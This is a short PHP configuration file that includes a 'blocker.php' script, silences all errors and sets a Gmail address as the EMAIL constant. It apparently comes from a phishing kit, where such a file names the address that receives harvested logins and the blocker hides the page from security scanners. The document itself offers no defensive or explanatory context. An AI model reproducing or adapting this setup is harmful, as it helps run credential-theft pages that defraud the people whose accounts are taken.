<?php
include('blocker.php');
error_reporting(0);
$ur_email   = "wongxiansheng724@gmail.com";
define("EMAIL", "$ur_email");
?>